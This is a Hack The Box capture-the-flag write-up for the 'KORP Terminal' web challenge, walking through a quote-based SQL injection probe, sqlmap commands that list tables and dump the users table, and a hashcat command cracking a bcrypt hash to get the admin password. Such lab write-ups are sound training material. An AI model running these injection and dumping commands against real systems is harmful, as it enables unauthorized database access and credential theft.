---
clayout: ctf
title: KORP Terminal
date: 2024-12-15
image: /icon/hack-the-box/web.svg
type: Hack The Box

ctf:
    - name: KORP Terminal
      link: https://app.hackthebox.com/challenges/647
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/647
          thumbnail: /ctf/hack-the-box/challenges/web/korp-terminal/pwned.png
---

## Challenge description

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out
more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and
security protocols.

## Challenge Overview

This challenge presents a web application with a login interface. Users must input a username and password. The goal is
to identify valid credentials to log in and retrieve the flag.

![KORP Terminal - Overview](/ctf/hack-the-box/challenges/web/korp-terminal/overview.png)

## Enumeration

After testing common credentials like `admin:admin` or `guest:guest`, no successful login was achieved. A closer
inspection of the request using tools like **Burp Suite** revealed no immediate clues. This prompted an attempt to test
for vulnerabilities like **SQL Injection**.

### Testing for SQL Injection

Using the payload below in the `username` field revealed a SQL error, confirming the application is vulnerable to SQL
Injection:

```sql
admin'
```

The server response provided the following error message:

```json
{
    "error": {
        "message": [
            "1064",
            "1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin''' at line 1",
            "42000"
        ],
        "type": "ProgrammingError"
    }
}
```

The error message clearly indicates a syntax issue caused by the unescaped input, confirming that the backend query is
vulnerable.

## Exploitation

To exploit this vulnerability, we used **sqlmap**, a powerful automated SQL Injection tool. Since the error revealed the
backend is running **MariaDB**, we specified this database management system in our command.

#### Step 1: Listing Database Tables

The following command was used to retrieve the names of all tables:

```bash
sqlmap -u "http://<challenge-ip>:<challenge-port>" --data="username=admin&password=admin" -p username --ignore-code 401 --dbms=MariaDB --tables
```

::: info Command Breakdown

- **`-u`**: Target URL.
- **`--data`**: Data sent in the POST request.
- **`-p`**: Parameter to test (in this case, `username`).
- **`--ignore-code`**: Ignore HTTP status codes (e.g., 401 Unauthorized).
- **`--dbms`**: Specify the database management system (`MariaDB`).
- **`--tables`**: Retrieve all table names.

:::

Output:

![Sqlmap - Tables](/ctf/hack-the-box/challenges/web/korp-terminal/sqlmap-tables.png)

Sqlmap revealed a database named **`korp_terminal`** with a table named **`users`**.

### Step 2: Dumping the `users` Table

To extract the contents of the `users` table, the following command was used:

```bash
sqlmap -u "http://94.237.61.84:38028" --data="username=admin&password=admin" -p username --ignore-code 401 --dbms=MariaDB -D korp_terminal -T users --dump
```

::: info Command Breakdown:

- **`-D`**: Specify the database to target (`korp_terminal`).
- **`-T`**: Specify the table to dump (`users`).
- **`--dump`**: Dump all rows from the specified table.

:::

Output:

![Sqlmap - Dump](/ctf/hack-the-box/challenges/web/korp-terminal/sqlmap-users-dump.png)

The dump revealed the `username` and `password` fields. The password field was hashed using bcrypt.

## Cracking the Password Hash

### Identifying the Hash Type

By comparing the extracted hash with examples from
the [Hashcat Hash Examples](https://hashcat.net/wiki/doku.php?id=example_hashes) page, it was identified as **bcrypt** (Hashcat
mode `3200`).

### Cracking the Hash with `hashcat`

To crack the bcrypt hash, the following command was used:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

::: info Command Breakdown

- **`-m 3200`**: Specify the hash type (`bcrypt`).
- **`hash.txt`**: Input file containing the hash.
- **`/usr/share/wordlists/rockyou.txt`**: Wordlist for brute force.

:::

Output:

```
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

The cracked password for the `admin` user was **`password123`**.

## Logging In

Using the credentials:

- **Username**: `admin`
- **Password**: `password123`

We successfully logged into the application and retrieved the flag:

```
HTB{f4k3_fl4g}
```

## References

- [SQLmap - Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
- [Hashcat Wiki - Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)